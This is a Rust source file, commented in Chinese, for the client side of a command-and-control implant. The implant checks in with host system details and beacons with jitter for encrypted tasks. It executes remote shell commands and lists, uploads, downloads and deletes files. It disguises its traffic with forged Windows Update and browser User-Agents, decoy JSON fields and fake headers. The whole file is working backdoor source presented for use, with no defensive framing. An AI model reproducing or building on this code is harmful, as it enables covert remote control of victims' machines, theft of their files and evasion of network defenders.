//! Implant 客户端连接管理 (统一加密端点 - 同步版本)

use crate::{config, handlers, sysinfo};
use shared::crypto::Crypto;
use shared::messages::Message;
use std::time::Duration;
use std::thread;
use serde::{Deserialize, Serialize};
use rand::Rng;

/// 统一请求格式（含伪装字段）
#[derive(Serialize)]
struct EncryptedRequest {
    // === 伪装字段（服务端忽略）===
    #[serde(rename = "apiVersion")]
    api_version: String,
    #[serde(rename = "clientId")]
    client_id: String,
    #[serde(rename = "authToken")]
    auth_token: String,
    #[serde(rename = "requestId")]
    request_id: String,
    timestamp: u64,
    platform: String,
    // === 真实数据 ===
    data: String,  // Base64 编码的加密数据
}

/// 平台与 User-Agent 配对
struct PlatformInfo {
    platform: &'static str,
    user_agent: &'static str,
}

const PLATFORM_CONFIGS: &[PlatformInfo] = &[
    PlatformInfo { platform: "Windows", user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" },
    PlatformInfo { platform: "Windows", user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" },
    PlatformInfo { platform: "Windows", user_agent: "Microsoft-Delivery-Optimization/10.0" },
    PlatformInfo { platform: "Windows", user_agent: "Windows-Update-Agent/10.0.19041.1" },
];

impl EncryptedRequest {
    /// 创建带伪装字段的请求
    fn new_with_platform(data: String, platform_idx: usize) -> Self {
        let mut rng = rand::thread_rng();
        let api_versions = ["1.0.0", "1.1.0", "1.2.3", "2.0.0", "2.1.0"];
        let config = &PLATFORM_CONFIGS[platform_idx % PLATFORM_CONFIGS.len()];
        
        Self {
            api_version: api_versions[rng.gen_range(0..api_versions.len())].to_string(),
            client_id: format!("{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.gen::<u32>(), rng.gen::<u16>(), rng.gen::<u16>(), 
                rng.gen::<u16>(), rng.gen::<u64>() & 0xFFFFFFFFFFFF),
            auth_token: format!("Bearer {}", Self::random_token(&mut rng, 32)),
            request_id: format!("req_{}", Self::random_token(&mut rng, 16)),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            platform: config.platform.to_string(),
            data,
        }
    }
    
    /// 获取随机平台索引
    fn random_platform_idx() -> usize {
        rand::thread_rng().gen_range(0..PLATFORM_CONFIGS.len())
    }
    
    /// 获取对应的 User-Agent
    fn get_user_agent(platform_idx: usize) -> &'static str {
        PLATFORM_CONFIGS[platform_idx % PLATFORM_CONFIGS.len()].user_agent
    }
    
    /// 生成随机十六进制字符串
    fn random_token<R: Rng>(rng: &mut R, len: usize) -> String {
        (0..len).map(|_| format!("{:02x}", rng.gen::<u8>())).collect()
    }
}

/// 统一响应格式
#[derive(Deserialize)]
struct EncryptedResponse {
    data: String,  // Base64 编码的加密数据
}

/// 解密后的请求格式
#[derive(Serialize)]
struct C2Request {
    #[serde(rename = "type")]
    request_type: String,
    client_id: String,
    payload: serde_json::Value,
}

/// 解密后的响应格式
#[derive(Deserialize)]
struct C2Response {
    #[allow(dead_code)]
    #[serde(rename = "type")]
    response_type: String,
    payload: serde_json::Value,
}

/// 客户端状态
pub struct Client {
    client_id: String,
    agent: ureq::Agent,
    crypto: Crypto,
    beacon_interval: Duration,
}

impl Client {
    pub fn new() -> Self {
        // 从配置创建加密器
        let crypto = Crypto::from_hex(config::ENCRYPTION_KEY)
            .expect("Invalid encryption key in config");
        
        // 创建同步 HTTP 客户端（支持 HTTPS）
        let tls_config = native_tls::TlsConnector::builder()
            .danger_accept_invalid_certs(false)  // 生产环境应验证证书
            .build()
            .expect("Failed to create TLS connector");
        
        let agent = ureq::AgentBuilder::new()
            .timeout(Duration::from_secs(30))
            .tls_connector(std::sync::Arc::new(tls_config))
            .build();
        
        Self {
            client_id: String::new(),
            agent,
            crypto,
            beacon_interval: Duration::from_secs(config::HEARTBEAT_INTERVAL),
        }
    }
    
    /// 主 Beacon 循环 (同步)
    pub fn connect_loop(&mut self) {
        loop {
            // 首先尝试上线
            match self.checkin() {
                Ok(_) => {
                    println!("[+] Checkin successful, starting beacon loop...");
                    
                    // 进入 Beacon 循环
                    if let Err(e) = self.beacon_loop() {
                        println!("[!] Beacon error: {}", e);
                    }
                }
                Err(e) => {
                    println!("[!] Checkin failed: {}", e);
                }
            }
            
            println!("[*] Waiting {} seconds before retry...", config::RECONNECT_DELAY);
            thread::sleep(Duration::from_secs(config::RECONNECT_DELAY));
        }
    }
    
    /// 发送加密请求 (同步)
    fn send_request(&self, request: &C2Request) -> Result<C2Response, Box<dyn std::error::Error>> {
        let c2_url = format!("{}/api/CpHDCPSvc", config::get_http_url());
        
        // 序列化请求
        let request_json = serde_json::to_vec(request)?;
        
        // 加密
        let encrypted = self.crypto.encrypt(&request_json)
            .map_err(|e| format!("Encryption failed: {:?}", e))?;
        
        // Base64 编码
        let encrypted_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &encrypted);
        
        // 选择随机平台（确保 platform 和 User-Agent 一致）
        let platform_idx = EncryptedRequest::random_platform_idx();
        let user_agent = EncryptedRequest::get_user_agent(platform_idx);
        
        // 发送请求（带伪装 Header）
        let mut rng = rand::thread_rng();
        let body = EncryptedRequest::new_with_platform(encrypted_b64, platform_idx);
        
        let response = self.agent
            .post(&c2_url)
            .set("User-Agent", user_agent)
            .set("X-Request-ID", &format!("{:032x}", rng.gen::<u128>()))
            .set("X-Client-Version", "2.1.0")
            .set("Accept-Language", "en-US,en;q=0.9")
            .set("Cache-Control", "no-cache")
            .set("X-Forwarded-Proto", "https")
            .set("Content-Type", "application/json")
            .send_json(&body)?;
        
        // 解析响应
        let encrypted_resp: EncryptedResponse = response.into_json()?;
        
        // Base64 解码
        let encrypted_data = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &encrypted_resp.data)?;
        
        // 解密
        let decrypted = self.crypto.decrypt(&encrypted_data)
            .map_err(|e| format!("Decryption failed: {:?}", e))?;
        
        // 反序列化
        let c2_response: C2Response = serde_json::from_slice(&decrypted)?;
        
        Ok(c2_response)
    }
    
    /// 发送上线信息 (同步)
    fn checkin(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let client_info = sysinfo::collect_system_info();
        self.client_id = client_info.id.clone();
        
        println!("[*] Checking in to {}...", config::get_http_url());
        
        let request = C2Request {
            request_type: "checkin".to_string(),
            client_id: self.client_id.clone(),
            payload: serde_json::to_value(&client_info)?,
        };
        
        let response = self.send_request(&request)?;
        
        if response.payload.get("success").and_then(|v| v.as_bool()) != Some(true) {
            return Err("Checkin rejected".into());
        }
        
        Ok(())
    }
    
    /// Beacon 轮询循环 (同步)
    fn beacon_loop(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        loop {
            // 发送 Beacon 请求获取任务
            match self.fetch_commands() {
                Ok(commands) => {
                    if !commands.is_empty() {
                        println!("[*] Received {} commands", commands.len());
                        
                        // 执行命令并收集响应
                        let responses = self.execute_commands(commands);
                        
                        // 提交响应
                        if !responses.is_empty() {
                            if let Err(e) = self.submit_results(responses) {
                                println!("[!] Failed to submit results: {}", e);
                            }
                        }
                    }
                }
                Err(e) => {
                    println!("[!] Beacon failed: {}", e);
                    return Err(e);
                }
            }
            
            // 计算带 jitter 的等待时间
            let wait_time = self.calculate_wait_with_jitter();
            
            #[cfg(debug_assertions)]
            println!("[*] Next beacon in {} seconds", wait_time.as_secs());
            
            thread::sleep(wait_time);
        }
    }
    
    /// 计算带 jitter 的等待时间
    fn calculate_wait_with_jitter(&self) -> Duration {
        const JITTER_THRESHOLD_SECS: u64 = 10;
        const JITTER_PERCENT: f64 = 0.2;
        
        let base_secs = self.beacon_interval.as_secs();
        
        if base_secs <= JITTER_THRESHOLD_SECS {
            return self.beacon_interval;
        }
        
        let jitter_range = (base_secs as f64 * JITTER_PERCENT) as u64;
        
        if jitter_range == 0 {
            return self.beacon_interval;
        }
        
        let mut rng = rand::thread_rng();
        let jitter: i64 = rng.gen_range(-(jitter_range as i64)..=(jitter_range as i64));
        let final_secs = (base_secs as i64 + jitter).max(1) as u64;
        
        Duration::from_secs(final_secs)
    }
    
    /// 从服务器获取待执行命令 (同步)
    fn fetch_commands(&self) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
        let request = C2Request {
            request_type: "beacon".to_string(),
            client_id: self.client_id.clone(),
            payload: serde_json::json!({}),
        };
        
        let response = self.send_request(&request)?;
        
        let commands_b64: Vec<String> = response.payload
            .get("commands")
            .and_then(|v| serde_json::from_value(v.clone()).ok())
            .unwrap_or_default();
        
        let mut commands = Vec::new();
        for cmd_b64 in commands_b64 {
            if let Ok(data) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &cmd_b64) {
                commands.push(data);
            }
        }
        
        Ok(commands)
    }
    
    /// 执行命令列表 (同步)
    fn execute_commands(&mut self, commands: Vec<Vec<u8>>) -> Vec<Vec<u8>> {
        let mut responses = Vec::new();
        
        for cmd_data in commands {
            let (response, should_exit, new_interval) = self.handle_message(&cmd_data);
            
            if let Some(interval) = new_interval {
                self.beacon_interval = Duration::from_secs(interval);
                println!("[*] Beacon interval updated to {} seconds", interval);
            }
            
            if should_exit {
                println!("[!] Received exit command, terminating...");
                std::process::exit(0);
            }
            
            if let Some(resp) = response {
                if let Ok(resp_data) = resp.serialize() {
                    responses.push(resp_data);
                }
            }
        }
        
        responses
    }
    
    /// 提交执行结果 (同步)
    fn submit_results(&self, responses: Vec<Vec<u8>>) -> Result<(), Box<dyn std::error::Error>> {
        let responses_b64: Vec<String> = responses.iter()
            .map(|data| base64::Engine::encode(&base64::engine::general_purpose::STANDARD, data))
            .collect();
        
        let request = C2Request {
            request_type: "result".to_string(),
            client_id: self.client_id.clone(),
            payload: serde_json::to_value(&responses_b64)?,
        };
        
        let response = self.send_request(&request)?;
        
        if response.payload.get("success").and_then(|v| v.as_bool()) != Some(true) {
            return Err("Submit results rejected".into());
        }
        
        println!("[*] Results submitted successfully");
        Ok(())
    }
    
    /// 处理接收到的消息 (同步)
    fn handle_message(&self, data: &[u8]) -> (Option<Message>, bool, Option<u64>) {
        let msg = match Message::deserialize(data) {
            Ok(m) => m,
            Err(e) => {
                println!("[!] Failed to deserialize message: {}", e);
                return (None, false, None);
            }
        };
        
        match msg {
            Message::ShellExecute(cmd) => {
                println!("[*] Executing shell command: {}", cmd.command);
                let response = handlers::shell::execute_shell_sync(&cmd);
                (Some(Message::ShellExecuteResponse(response)), false, None)
            }
            Message::Exit => {
                println!("[!] Received exit command, terminating...");
                (None, true, None)
            }
            Message::SetBeaconInterval(req) => {
                println!("[*] Received set beacon interval: {} seconds", req.interval_seconds);
                (None, false, Some(req.interval_seconds))
            }
            Message::GetDirectoryListing(req) => {
                println!("[*] Getting directory listing: {}", req.path);
                let response = handlers::files::get_directory_listing(&req);
                (Some(Message::DirectoryListingResponse(response)), false, None)
            }
            Message::FileDownload(req) => {
                println!("[*] Downloading file: {}", req.path);
                let response = handlers::files::download_file(&req);
                (Some(Message::FileDownloadResponse(response)), false, None)
            }
            Message::FileUpload(req) => {
                println!("[*] Uploading file: {}", req.path);
                let response = handlers::files::upload_file(&req);
                (Some(Message::FileUploadResponse(response)), false, None)
            }
            Message::FileDelete(req) => {
                println!("[*] Deleting file: {}", req.path);
                let response = handlers::files::delete_file(&req);
                (Some(Message::FileDeleteResponse(response)), false, None)
            }
            _ => {
                println!("[?] Unknown message type");
                (None, false, None)
            }
        }
    }
}
